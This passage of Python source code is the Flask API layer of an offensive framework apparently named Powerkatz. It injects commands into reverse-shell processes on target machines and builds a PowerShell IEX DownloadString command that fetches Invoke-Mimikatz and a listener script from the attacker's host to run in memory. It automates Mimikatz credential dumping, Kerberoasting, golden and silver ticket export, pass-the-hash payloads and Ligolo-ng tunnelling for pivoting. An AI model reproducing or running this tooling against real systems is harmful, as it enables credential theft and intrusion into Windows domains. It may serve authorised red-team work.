        if not matchedTargetIpAddress:
            messageOutput = f'Target IP address {targetIpAddress} is not a valid IPv4 address.'
            return jsonify(status='Failed', message=messageOutput)

        powerkatzServerListenerStatus = current_app.config['settings']['generalSettings'][targetIpAddress]['powerkatzServerListenerStatus']
        if powerkatzServerListenerStatus != 'Up and running':
            messageOutput = f'Target IP address {targetIpAddress}\'s Powerkatz Server Listener is down.'
            return jsonify(status='Failed', message=messageOutput)
    
    isEnumeratedSuccessfully = enumerateComputerDomain(targetIpAddresses)
    if not isEnumeratedSuccessfully:
        messageOutput = 'Unable to enumerate the selected target computer(s).'
        return jsonify(status='Failed', message=messageOutput)

    formattedTargetIpAddress = ', '.join(targetIpAddresses)
    messageOutput = f'Successfully enumerated again on target(s): {formattedTargetIpAddress}.'
    return jsonify(status='Succeed', message=messageOutput)

@api.route('/exportAllHistory', methods=('GET',))
def exportAllHistory():
    issuedCommandJson = current_app.config['powerkatzHistoryObject'].exportAllHistoryAsJson().encode('utf-8')

    buffer = BytesIO()
    buffer.write(issuedCommandJson)
    buffer.seek(0)
    return send_file(buffer, mimetype='application/json', as_attachment=True, download_name='powerkatz_all_exported_history.json')

@api.route('/exportHistory/<int:id>', methods=('GET',))
def exportHistoryById(id):
    issuedCommandJson = current_app.config['powerkatzHistoryObject'].exportHistoryAsJsonById(id).encode('utf-8')

    buffer = BytesIO()
    buffer.write(issuedCommandJson)
    buffer.seek(0)
    return send_file(buffer, mimetype='application/json', as_attachment=True, download_name=f'powerkatz_exported_history_id{id}.json')

@api.route('/importHistories', methods=('POST',))
def importHistories():
    try:
        historyFiles = request.files.getlist('historyFiles')
    except:
        messageOutput = 'No history file(s) is/are selected.'
        return jsonify(status='Failed', message=messageOutput)

    idCounter = 0
    historyFilesContent = dict()
    for historyFile in historyFiles:
        jsonContent = json.loads(historyFile.read().decode())
        for key, value in jsonContent.items():
            idCounter += 1
            historyFilesContent[idCounter] = value

    try:
        for key, value in historyFilesContent.items():
            timestamp = value['timestamp']
            executedFunction = value['executedFunction']
            targetIpAddress = value['targetIpAddress']
            domain = value['domain']
            status = value['status']
            command = value['command']
            result = value['executedCommandResult']
            isFromImporting = True
            currentTime = timestamp

            current_app.config['powerkatzHistoryObject'].setIssuedCommands(executedFunction, targetIpAddress, status, command, result, isFromImporting, currentTime, domain)
    except Exception as error:
        print(f'[ERROR] An error occurred in importHistories(), error message: {error}')
        messageOutput = 'Incorrect history JSON format.'
        return jsonify(status='Failed', message=messageOutput) 

    messageOutput = 'History file(s) is/are successfully imported! Refresh the page to see results.'
    return jsonify(status='Succeed', message=messageOutput)

@api.route('/exportAllSettings', methods=('GET',))
async def exportAllSettings():
    allSettings = current_app.config['settings']

    # we don't need to export the socket object
    # we can just create another new socket object if needed
    for targetIpAddress in current_app.config['settings']['generalSettings']:
        allSettings['generalSettings'][targetIpAddress]['remoteSocket'] = dict()

    allSettingsJson = json.dumps(allSettings).encode('utf-8')

    buffer = BytesIO()
    buffer.write(allSettingsJson)
    buffer.seek(0)

    # after overwriting the socket object, the connection is closed
    # so we need to create a new socket object again
    for targetIpAddress in current_app.config['settings']['generalSettings']:
        remoteSocket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        powerkatzServerListenerStatus = current_app.config['settings']['generalSettings'][targetIpAddress]['powerkatzServerListenerStatus']
        # only previously connected sockets need to be reconnected again
        if powerkatzServerListenerStatus == 'Up and running':
            isPowerkatzListenerAlive = await powerShellListenerPing(remoteSocket, [targetIpAddress], current_app.config['settings']['generalSettings'][targetIpAddress]['powerkatzListenerPortNumber'])
            if not isPowerkatzListenerAlive:
                current_app.config['settings']['generalSettings'][targetIpAddress]['powerkatzServerListenerStatus'] = 'Down'

            current_app.config['settings']['generalSettings'][targetIpAddress]['powerkatzServerListenerStatus'] = 'Up and running'

        current_app.config['settings']['generalSettings'][targetIpAddress]['remoteSocket'] = remoteSocket

    return send_file(buffer, mimetype='application/json', as_attachment=True, download_name='powerkatz_all_settings.json')

@api.route('/importSettings', methods=('POST',))
async def importSettings():
    try:
        settingsFileObject = request.files['settingsFile']
    except KeyError as error:
        print(f'[ERROR] A KeyError occurred in importSettings(), error message: {error}')
        messageOutput = 'No settings file is selected.'
        return jsonify(status='Failed', message=messageOutput)

    settingsFile = ''
    for line in settingsFileObject:
        settingsFile += line.decode()
    try:
        settingsFileJson = json.loads(settingsFile)
    except Exception as error:
        print(f'[ERROR] An error occurred in importSettings(), error message: {error}')
        messageOutput = 'Unable to convert the uploaded file into JSON format.'
        return jsonify(status='Failed', message=messageOutput)

    try:
        for targetIpAddress in settingsFileJson['generalSettings']:
            currentSession = settingsFileJson['generalSettings'][targetIpAddress]['currentSession']
            shellType = settingsFileJson['generalSettings'][targetIpAddress]['shellType']
            isControllableShell, isOtherShell = checkControllableShell(currentSession, shellType)
            # close the socket if the target IP address is the same as the current one
            if targetIpAddress in current_app.config['settings']['generalSettings']:
                originalRemoteSocket = current_app.config['settings']['generalSettings'][targetIpAddress]['remoteSocket']
                isSocketClosed = closeSocket(originalRemoteSocket)
                if not isSocketClosed:
                    messageOutput = 'Unable to close the current socket.'
                    return jsonify(status='Failed', message=messageOutput)

                if isControllableShell:
                    processFd = settingsFileJson['generalSettings'][targetIpAddress]['processFd']
                    shellPid = settingsFileJson['generalSettings'][targetIpAddress]['shellPid']
                    command = 'Stop-Job -Name ServerListener; Remove-Job -Name ServerListener'
                    await core.helper.pkinjector.injectStringsToProcess(processFd, shellPid, command)

            remoteSocket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            # setup the Powerkatz Server Listener for controllable shell
            if isControllableShell:
                processFd = settingsFileJson['generalSettings'][targetIpAddress]['processFd']
                shellPid = settingsFileJson['generalSettings'][targetIpAddress]['shellPid']
                attackerIpAddress = settingsFileJson['otherGeneralSettings']['attackerIpAddress']

                await ignoreSSLCheck(processFd, shellPid)

                # transfer PowerShell server listener in memory
                command = f"""$serverListenerString = 'IEX (New-Object System.Net.Webclient).DownloadString(''https://{attackerIpAddress}/static/transferFiles/Invoke-Mimikatz.ps1'')' + [Environment]::NewLine + '$apiResponse = Invoke-RestMethod -UseBasicParsing -Uri https://{attackerIpAddress}/api/getKeyIv' + [Environment]::NewLine + (New-Object System.Net.Webclient).DownloadString('https://{attackerIpAddress}/static/transferFiles/Powerkatz_server.ps1')"""
                await core.helper.pkinjector.injectStringsToProcess(processFd, shellPid, command)

                powerkatzListenerPortNumber = settingsFileJson['generalSettings'][targetIpAddress]['powerkatzListenerPortNumber']
                isListenerStarted = await startPowerShellListenerJob(processFd, shellPid, remoteSocket, targetIpAddress, powerkatzListenerPortNumber)
                if not isListenerStarted:
                    messageOutput = f'Target {targetIpAddress} machine is down or unable to reach our Flask web app.'
                    return jsonify(status='Failed', message=messageOutput)
            else:
                # check the Powerkatz Server Listener is up and running
                powerkatzListenerPortNumber = settingsFileJson['generalSettings'][targetIpAddress]['powerkatzListenerPortNumber']
                isPowerkatzListenerAlive = await powerShellListenerPing(remoteSocket, [targetIpAddress], powerkatzListenerPortNumber)
                if not isPowerkatzListenerAlive:
                    settingsFileJson['generalSettings'][targetIpAddress]['powerkatzServerListenerStatus'] = 'Down'
                    messageOutput = f'Target {targetIpAddress}\'s Powerkatz Server Listener is not listening.'
                    return jsonify(status='Failed', message=messageOutput)

            settingsFileJson['generalSettings'][targetIpAddress]['remoteSocket'] = remoteSocket
            settingsFileJson['generalSettings'][targetIpAddress]['powerkatzServerListenerStatus'] = 'Up and running'

        if 'tunnelingStatus' in settingsFileJson['otherGeneralSettings']:
            if 'tunnelingStatus' in current_app.config['settings']['otherGeneralSettings']:
                if current_app.config['settings']['otherGeneralSettings']['tunnelingStatus'] == 'Up and running':
                    await stopTunneling()

            powerkatzAgent.createNewTunnelingProxyProcess()
            await addNewIpRouteToLigoloNgInterfaceFromImporting(settingsFileJson)

            result = await transferLigoloNgAgentFromImporting(settingsFileJson)
            for targetIpAddress in result:
                status = result[targetIpAddress]['status']
                messageOutput = result[targetIpAddress]['messageOutput']
                if status == 'Failed':
                    return jsonify(status=status, message=messageOutput)

                await setupTunneling(targetIpAddress, settingsFileJson=settingsFileJson)
                settingsFileJson['otherGeneralSettings']['tunnelingStatus'] = 'Up and running'

    except KeyError as error:
        print(f'[ERROR] A KeyError occurred in importSettings(), error message: {error}')
        messageOutput = 'The settings JSON file is not in the correct settings format.'
        return jsonify(status='Failed', message=messageOutput)

    current_app.config['settings'] = settingsFileJson

    messageOutput = 'Settings are successfully imported.'
    return jsonify(status='Succeed', message=messageOutput)

@api.route('/updateSettings', methods=('POST',))
def updateSettings():
    jsonBody = request.json

    temporarySettings = jsonBody
    temporarySettings['targetComputer'] = current_app.config['settings']['targetComputer']
    temporarySettings['targetDomain'] = current_app.config['settings']['targetDomain']
    temporarySettings['executor'] = current_app.config['settings']['executor']
    temporarySettings['otherGeneralSettings']['attackerNetworkInterface'] = current_app.config['settings']['otherGeneralSettings']['attackerNetworkInterface']
    temporarySettings['otherGeneralSettings']['isRegistered'] = current_app.config['settings']['otherGeneralSettings']['isRegistered']
    temporarySettings['otherGeneralSettings']['interfacesDetail'] = current_app.config['settings']['otherGeneralSettings']['interfacesDetail']
    if 'tunnelingStatus' in current_app.config['settings']['otherGeneralSettings']:
        temporarySettings['otherGeneralSettings']['tunnelingStatus'] = current_app.config['settings']['otherGeneralSettings']['tunnelingStatus']

    # validate new settings
    if not jsonBody['otherGeneralSettings']['attackerIpAddress']:
        messageOutput = 'Missing attacker IP address.'
        return jsonify(status='Failed', message=messageOutput)

    if not jsonBody['generalSettings']:
        messageOutput = 'Missing target IP address(es).'
        return jsonify(status='Failed', message=messageOutput)

    ipv4IpAddressPattern = r'^((25[0-5]|(2[0-4]|1\d|[1-9]|)\d)\.?\b){4}$'
    attackerIpAddress = jsonBody['otherGeneralSettings']['attackerIpAddress']
    matchedAttackerIpAddress = match(ipv4IpAddressPattern, attackerIpAddress)
    if not matchedAttackerIpAddress:
        messageOutput = f'Attacker IP address {attackerIpAddress} is not a valid IPv4 address.'
        return jsonify(status='Failed', message=messageOutput)

    for targetIpAddress in jsonBody['generalSettings']:
        matchedTargetIpAddress = match(ipv4IpAddressPattern, targetIpAddress)
        if not matchedTargetIpAddress:
            messageOutput = f'Target IP address {targetIpAddress} is not a valid IPv4 address.'
            return jsonify(status='Failed', message=messageOutput)

        powerkatzListenerPortNumber = jsonBody['generalSettings'][targetIpAddress]['powerkatzListenerPortNumber']
        if not powerkatzListenerPortNumber:
            messageOutput = f'Target {targetIpAddress} is missing Powerkatz Server Listener port number.'
            return jsonify(status='Failed', message=messageOutput)
        if not powerkatzListenerPortNumber.isdigit():
            messageOutput = f'Target {targetIpAddress} Powerkatz Server Listener port number is not a number.'
            return jsonify(status='Failed', message=messageOutput)

        HIGHEST_PORT_NUMBER = 65535
        powerkatzListenerPortNumber = int(powerkatzListenerPortNumber)
        if powerkatzListenerPortNumber > HIGHEST_PORT_NUMBER:
            messageOutput = f'Target {targetIpAddress} Powerkatz Server Listener port number is an invalid port number.'
            return jsonify(status='Failed', message=messageOutput)

        currentSession = jsonBody['generalSettings'][targetIpAddress]['currentSession']
        if not currentSession:
            messageOutput = f'Target {targetIpAddress} has no current session selected.'
            return jsonify(status='Failed', message=messageOutput)

        validCurrentSession = ('shell', 'rdpOrVnc')
        if currentSession not in validCurrentSession:
            messageOutput = f'Target {targetIpAddress} has an invalid current session.'
            return jsonify(status='Failed', message=messageOutput)

        if currentSession == validCurrentSession[0]:
            validShellType = ('Netcat/socat listener (reverse/bind shell)', 'other', 'N/A')
            shellType = jsonBody['generalSettings'][targetIpAddress]['shellType']
            if shellType not in validShellType:
                messageOutput = f'Target {targetIpAddress} has chosen an invalid listener.'
                return jsonify(status='Failed', message=messageOutput)

            if shellType == validShellType[0]:
                listenerPortNumber = jsonBody['generalSettings'][targetIpAddress]['listenerPortNumber']
                if not listenerPortNumber:
                    messageOutput = f'Target {targetIpAddress} is missing listener port number.'
                    return jsonify(status='Failed', message=messageOutput)

                if not listenerPortNumber.isdigit():
                    messageOutput = f'Target {targetIpAddress} listener port number is not a number.'
                    return jsonify(status='Failed', message=messageOutput)

                shellPid = jsonBody['generalSettings'][targetIpAddress]['shellPid']
                if not shellPid:
                    messageOutput = f'Target {targetIpAddress} is missing shell PID.'
                    return jsonify(status='Failed', message=messageOutput)

                if not shellPid.isdigit():
                    messageOutput = f'Target {targetIpAddress} shell PID is not a number.'
                    return jsonify(status='Failed', message=messageOutput)

                processFd = jsonBody['generalSettings'][targetIpAddress]['processFd']
                if not processFd:
                    messageOutput = f'Target {targetIpAddress} is missing process file descriptor.'
                    return jsonify(status='Failed', message=messageOutput)

                if not processFd.isdigit():
                    messageOutput = f'Target {targetIpAddress} process file descriptor is not a number.'
                    return jsonify(status='Failed', message=messageOutput)

                isFailed, messageOutput, shellInformation = getShellInformation(targetIpAddress, listenerPortNumber, attackerIpAddress)
                if isFailed:
                    return jsonify(status='Failed', message=messageOutput)
                if shellInformation['shellPid'] != shellPid:
                    messageOutput = f'Target {targetIpAddress}\'s process ID ({shellPid}) is mismatched from the application ({shellInformation["shellPid"]}).'
                    return jsonify(status='Failed', message=messageOutput)
                if shellInformation['processFd'] != processFd:
                    messageOutput = f'Target {targetIpAddress}\'s process file descriptor ({processFd}) is mismatched from the application ({shellInformation["processFd"]}).'
                    return jsonify(status='Failed', message=messageOutput)

        powerkatzServerListenerStatus = jsonBody['generalSettings'][targetIpAddress]['powerkatzServerListenerStatus']
        if not powerkatzServerListenerStatus:
            messageOutput = f'Target {targetIpAddress} is missing Powerkatz Server Listener\'s status.'
            return jsonify(status='Failed', message=messageOutput)

        validPowerkatzServerListenerStatus = ('Up and running', 'Down')
        if powerkatzServerListenerStatus not in validPowerkatzServerListenerStatus:
            messageOutput = f'Target {targetIpAddress} has an invalid Powerkatz Server Listener\'s status.'
            return jsonify(status='Failed', message=messageOutput)

        currentPowerkatzServerListenerStatus = current_app.config['settings']['generalSettings'][targetIpAddress]['powerkatzServerListenerStatus']
        if powerkatzServerListenerStatus != currentPowerkatzServerListenerStatus:
            messageOutput = f'Target {targetIpAddress}\'s Powerkatz Server Listener status cannot be updated.'
            return jsonify(status='Failed', message=messageOutput)

        setupComplete = jsonBody['generalSettings'][targetIpAddress]['setupComplete']
        if not setupComplete:
            messageOutput = f'Target {targetIpAddress} is missing initial setup completion status.'
            return jsonify(status='Failed', message=messageOutput)

        validSetupComplete = ('Completed', 'Not completed')
        if setupComplete not in validSetupComplete:
            messageOutput = f'Target {targetIpAddress} has an invalid initial setup completion status.'
            return jsonify(status='Failed', message=messageOutput)

        currentSetupComplete = current_app.config['settings']['generalSettings'][targetIpAddress]['setupComplete']
        formattedCurrentSetupComplete = 'Completed' if currentSetupComplete else 'Not completed'
        if setupComplete != formattedCurrentSetupComplete:
            messageOutput = f'Target {targetIpAddress}\'s initial setup completion status cannot be updated.'
            return jsonify(status='Failed', message=messageOutput)

    for targetIpAddress in jsonBody['generalSettings']:
        remoteSocket = current_app.config['settings']['generalSettings'][targetIpAddress]['remoteSocket']
        temporarySettings['generalSettings'][targetIpAddress]['remoteSocket'] = remoteSocket

        updatedPowerkatzListenerPortNumber = int(jsonBody['generalSettings'][targetIpAddress]['powerkatzListenerPortNumber'])
        temporarySettings['generalSettings'][targetIpAddress]['powerkatzListenerPortNumber'] = updatedPowerkatzListenerPortNumber

        updatedSetupComplete = True if jsonBody['generalSettings'][targetIpAddress]['setupComplete'] == 'Completed' else False
        temporarySettings['generalSettings'][targetIpAddress]['setupComplete'] = updatedSetupComplete

    if jsonBody['otherGeneralSettings']['passwordCrackingWordlist'] == '':
        temporarySettings['otherGeneralSettings']['passwordCrackingWordlist'] = current_app.config['settings']['otherGeneralSettings']['passwordCrackingWordlist']
    else:
        filename = jsonBody['otherGeneralSettings']['passwordCrackingWordlist']
        wordlistFullPath = getWordlistFullPath(filename)
        temporarySettings['otherGeneralSettings']['passwordCrackingWordlist'] = wordlistFullPath

    current_app.config['settings'] = temporarySettings

    messageOutput = 'All the changes have been updated.'
    return jsonify(status='Succeed', message=messageOutput)

@api.route('/getSettings', methods=('GET',))
def getSettings():
    settings = dict()
    settings['generalSettings'] = dict()
    for targetIpAddress in current_app.config['settings']['generalSettings']:
        currentSession = current_app.config['settings']['generalSettings'][targetIpAddress]['currentSession']
        settings['generalSettings'][targetIpAddress] = dict()
        settings['generalSettings'][targetIpAddress]['currentSession'] = currentSession

    settings['targetComputer'] = current_app.config['settings']['targetComputer']
    settings['targetDomain'] = current_app.config['settings']['targetDomain']
    settings['executor'] = current_app.config['settings']['executor']

    return jsonify(status='Succeed', settings=settings)

@api.route('/getAllAgentsId', methods=('GET',))
def getAllAgentsId():
    try:
        allAgents = powerkatzAgent.getAllAgentsInformation()
    except Exception as error:
        print(f'[ERROR] An error occurred in getAllAgentsId(), error message: {error}')
        messageOutput = 'Unable to retrieve all agents\' ID.'
        return jsonify(status='Failed', message=messageOutput) 

    return jsonify(status='Succeed', allAgents=allAgents)

@api.route('/getAgentExecutedCommands', methods=('POST',))
def getAgentExecutedCommands():
    jsonBody = request.json
    agentId = jsonBody['agentId']

    if not agentId:
        messageOutput = 'Missing agent ID.'
        return jsonify(status='Failed', message=messageOutput)

    try:
        executedCommands = powerkatzAgent.getAgentExecutedCommands(agentId)
    except KeyError as error:
        print(f'[ERROR] A KeyError occurred in getAgentExecutedCommands(), error message: {error}')
        messageOutput  = f'Unable to retrieve executed commands for agent ID {agentId}.'
        return jsonify(status='Failed', message=messageOutput)

    return jsonify(status='Succeed', executedCommands=executedCommands)

@api.route('/getProxyExecutedCommands', methods=('GET',))
def getProxyExecutedCommands():
    try:
        executedCommands = powerkatzAgent.getTunnelingProxyExecutedCommands()
    except Exception as error:
        print(f'[ERROR] An error occurred in getProxyExecutedCommands(), error message: {error}')
        messageOutput  = f'Unable to retrieve executed commands for tunneling proxy process.'
        return jsonify(status='Failed', message=messageOutput)

    return jsonify(status='Succeed', executedCommands=executedCommands)

@api.route('/agentExecuteCommand', methods=('POST',))
def agentExecuteCommand():
    jsonBody = request.json
    agentId = jsonBody['agentId']
    command = jsonBody['command']

    try:
        output = powerkatzAgent.executeCommandOnAgentProcess(agentId, command)
    except Exception as error:
        print(f'[ERROR] An error occurred in agentExecuteCommand(), error message: {error}')
        messageOutput = f'Unable to execute command on agent ID {agentId}.'
        return jsonify(status='Failed', message=messageOutput)

    return jsonify(status='Succeed', output=output)

@api.route('/proxyExecuteCommand', methods=('POST',))
def proxyExecuteCommand():
    jsonBody = request.json
    command = jsonBody['command']

    try:
        output = powerkatzAgent.executeCommandOnTunnelingProxyProcess(command)
    except Exception as error:
        print(f'[ERROR] An error occurred in proxyExecuteCommand(), error message: {error}')
        messageOutput = 'Unable to execute command on tunneling proxy process.'
        return jsonify(status='Failed', message=messageOutput)

    return jsonify(status='Succeed', output=output)

@api.route('/killAgent', methods=('POST',))
def killAgent():
    jsonBody = request.json
    agentId = jsonBody['agentId']

    try:
        agent = powerkatzAgent.getAgentById(agentId)
        payloadExecutableFilename = agent['payloadExecutableFilename']
        targetIpAddress = agent['targetIpAddress']

        # delete the payload executable that was generated from the Pass-the-Hash attack function
        if payloadExecutableFilename != '':
            command = f'Remove-Item -Path C:\\Windows\\Temp\\{payloadExecutableFilename} -Force'
            ciphertext = current_app.config['AESEncryptorObject'].encryptAESCBC(command.encode())
            base64Ciphertext = current_app.config['AESEncryptorObject'].getBase64encryptedAESCBC(ciphertext)
            message = base64Ciphertext
            message += '\n'
            try:
                remoteSocket = current_app.config['settings']['generalSettings'][targetIpAddress]['remoteSocket']
                remoteSocket.sendall(message.encode())
                ciphertext = b64decode(recvall(remoteSocket, 8).strip().decode())
            except Exception as error:
                print(f'[ERROR] An error occurred in killAgent(), error message: {error}')
                messageOutput = f'Unable to kill agent ID {agentId} because the Pass-the-Hash attack function\'s reverse shell payload executable cannot be removed.'
                return jsonify(status='Failed', message=messageOutput)

        powerkatzAgent.removeAgent(agentId)
    except Exception as error:
        print(f'[ERROR] An error occurred in killAgent(), error message: {error}')
        messageOutput = f'Unable to kill agent ID {agentId}.'
        return jsonify(status='Failed', message=messageOutput)

    messageOutput = f'Agent ID {agentId} has been killed'
    return jsonify(status='Succeed', message=messageOutput)

@api.route('/exportTgsTicket/<string:attackFunction>/<string:username>/<string:service>', methods=('GET',))
@api.route('/exportTgsTicket/<string:attackFunction>/<string:username>', methods=('GET',))
def exportTgsTicket(attackFunction, username, service=None):
    base64TgsTicket = str()
    for executorUsername in current_app.config['settings']['executor']:
        if executorUsername != username:
            continue
        if attackFunction not in current_app.config['settings']['executor'][executorUsername]:
            continue

        if attackFunction == 'kerberoasting':
            base64TgsTicket = current_app.config['settings']['executor'][executorUsername][attackFunction]['base64TgsTicket']
            downloadFilename = f'powerkatz_exported_tgs_ticket_{username}.kirbi'
        elif attackFunction == 'silverTicket':
            tickets = current_app.config['settings']['executor'][executorUsername][attackFunction]['tickets']
            for ticket in tickets:
                if ticket['username'] != username:
                    continue
                if ticket['service'] != service:
                    continue

                base64TgsTicket = ticket['base64TgsTicket']
                service = ticket['service']
                downloadFilename = f'powerkatz_exported_tgs_ticket_{username}_{service}.kirbi'
                break
        elif attackFunction == 'goldenTicket':
            tickets = current_app.config['settings']['executor'][executorUsername][attackFunction]['tickets']
            for ticket in tickets:
                if ticket['username'] != username:
                    continue

                base64TgsTicket = ticket['base64TgsTicket']
                downloadFilename = f'powerkatz_exported_tgt_golden_ticket_{username}.kirbi'
                break

        break

    if not base64TgsTicket:
        messageOutput = f'Unable to find service account username {username}\'s TGS ticket.'
        return jsonify(status='Failed', message=messageOutput)

    tgsTicket = b64decode(base64TgsTicket)

    buffer = BytesIO()
    buffer.write(tgsTicket)
    buffer.seek(0)
    return send_file(buffer, as_attachment=True, download_name=downloadFilename)

@api.route('/automateExecutorEnumerate', methods=('GET',))
def automateExecutorEnumerate():
    for targetIpAddress in current_app.config['settings']['generalSettings']:
        isEnumeratedSuccessfully = enumerateComputerDomain([targetIpAddress])
        if not isEnumeratedSuccessfully:
            messageOutput = f'Target {targetIpAddress} is unable to enumerate computer information!'
            return jsonify(status='Failed', message=messageOutput)

    messageOutput = 'The Enumerator has been automatically executed.'
    return jsonify(status='Succeed', message=messageOutput)

@api.route('/automateExecutorCredentialDumping', methods=('GET',))
def automateExecutorCredentialDumping():
    for targetIpAddress in current_app.config['settings']['generalSettings']:
        isCredentialDumpedSuccessfully = executeCredentialDumping([targetIpAddress])
        if not isCredentialDumpedSuccessfully:
            messageOutput = f'Target {targetIpAddress} unable to execute attack function "Dump Recently Logged on Accounts\' Password (Mimikatz sekurlsa::logonpasswords)" automatically!'
            return jsonify(status='Failed', message=messageOutput)

    messageOutput = 'The attack function "Dump Recently Logged on Accounts\' Password (Mimikatz sekurlsa::logonpasswords)" has been automatically executed.'
    return jsonify(status='Succeed', message=messageOutput)

@api.route('/automateExecutorGetDomainComputers', methods=('GET',))
def automateExecutorGetDomainComputers():
    domainJoinedComputers = list()
    hasMultipleSubnets = False
    try:
        for targetIpAddress in current_app.config['settings']['generalSettings']:
            isDomainJoinedComputer = current_app.config['settings']['targetComputer'][targetIpAddress]['isDomainJoinedComputer']
            if not isDomainJoinedComputer:
                break

            domainJoinedComputers.append(targetIpAddress)

        for domain in current_app.config['settings']['targetDomain']:
            if not domain:
                continue

            domainNeworks = current_app.config['settings']['targetDomain'][domain]['networks']
            if len(domainNeworks) > 1:
                hasMultipleSubnets = True
    except Exception as error:
        print(f'[ERROR] An error occurred in automateExecutorGetDomainComputers(), error message: {error}')
        messageOutput = f'Unable to retrieve domain computer information on target {targetIpAddress}.'
        return jsonify(status='Failed', message=messageOutput)

    messageOutput = 'Domain computer information has been automatically retrieved.'
    return jsonify(status='Succeed', message=messageOutput, domainJoinedComputers=domainJoinedComputers, hasMultipleSubnets=hasMultipleSubnets)

@api.route('/automateExecutorKeberoasting', methods=('GET',))
def automateExecutorKeberoasting():
    isKeberoastingSuccessful = executeKeberoasting()
    if not isKeberoastingSuccessful:
        messageOutput = f'Unable to execute attack function "Extract & Crack Service Accounts\' Password (Kerberoasting)" automatically!'
        return jsonify(status='Failed', message=messageOutput)

    messageOutput = 'The attack function "Extract & Crack Service Accounts\' Password (Kerberoasting)" has been automatically executed'
    return jsonify(status='Succeed', message=messageOutput)

@api.route('/automateExecutorSetupTunneling', methods=('GET',))
async def automateExecutorSetupTunneling():
    powerkatzAgent.createNewTunnelingProxyProcess()
    await addNewIpRouteToLigoloNgInterface()

    status, messageOutput = await transferAndSetupTunneling()
    return jsonify(status=status, message=messageOutput)